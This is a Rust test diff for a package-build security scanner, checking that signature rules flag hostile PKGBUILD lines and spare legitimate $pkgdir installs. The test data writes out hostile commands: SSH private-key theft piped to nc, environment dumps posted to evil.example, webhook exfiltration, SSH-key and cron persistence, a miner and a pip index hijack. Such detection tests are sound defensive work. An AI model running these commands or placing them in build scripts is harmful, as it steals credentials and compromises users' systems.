@@ -206,6 +206,71 @@ fn advanced_security_rules() {
     }
 }
 
+/// The YARA-style signature database catches miners, exfiltration channels and
+/// persistence/defense-evasion shapes.
+#[test]
+fn yara_signature_rules() {
+    let cases: &[(&str, &str)] = &[
+        (
+            "./xmrig -o stratum+tcp://pool.minexmr.com:4444",
+            "CRYPTO_MINER",
+        ),
+        (
+            "curl -X POST https://discord.com/api/webhooks/123/abc -d @loot",
+            "DISCORD_EXFIL",
+        ),
+        (
+            "curl \"https://api.telegram.org/bot123:abc/sendMessage\"",
+            "TELEGRAM_EXFIL",
+        ),
+        (
+            "echo 'ssh-rsa AAAA attacker' >> /root/.ssh/authorized_keys",
+            "SSH_KEY_INJECT",
+        ),
+        ("echo '* * * * * sh /tmp/x' | crontab -", "CRON_PERSIST"),
+        ("systemctl enable evil.service", "SYSTEMD_PERSIST"),
+        ("tar czf - ~/.ssh/id_rsa | nc 1.2.3.4 9999", "CRED_HARVEST"),
+        ("curl -d \"$(printenv)\" http://evil.example", "ENV_EXFIL"),
+        ("setenforce 0", "DISABLE_SECURITY"),
+        ("curl -k https://evil.example/x.sh", "INSECURE_FETCH"),
+        (
+            "pip install requests --index-url http://evil.example/simple",
+            "PIP_INDEX_HIJACK",
+        ),
+    ];
+    for (line, code) in cases {
+        let pkgbuild = format!("build() {{\n  {line}\n}}");
+        let report = analyze(
+            None,
+            &PkgSources::from_pkgbuild(pkgbuild),
+            &Config::default(),
+            None,
+            now(),
+        );
+        assert!(
+            codes(&report).contains(code),
+            "line {line:?} should trigger {code}, got {:?}",
+            codes(&report)
+        );
+    }
+}
+
+/// Legitimate packaging into `$pkgdir` must not trip the persistence rules.
+#[test]
+fn pkgdir_persistence_not_flagged() {
+    let pkgbuild = "package() {\n  install -Dm644 cronfile \"$pkgdir/etc/cron.d/app\"\n  install -Dm644 svc \"$pkgdir/usr/lib/systemd/system/app.service\"\n}";
+    let report = analyze(
+        None,
+        &PkgSources::from_pkgbuild(pkgbuild),
+        &Config::default(),
+        None,
+        now(),
+    );
+    let c = codes(&report);
+    assert!(!c.contains(&"CRON_PERSIST"), "got {c:?}");
+    assert!(!c.contains(&"SSH_KEY_INJECT"), "got {c:?}");
+}
+
 /// A write into $pkgdir is NOT flagged as a system-path write.
 #[test]
 fn pkgdir_write_is_allowed() {
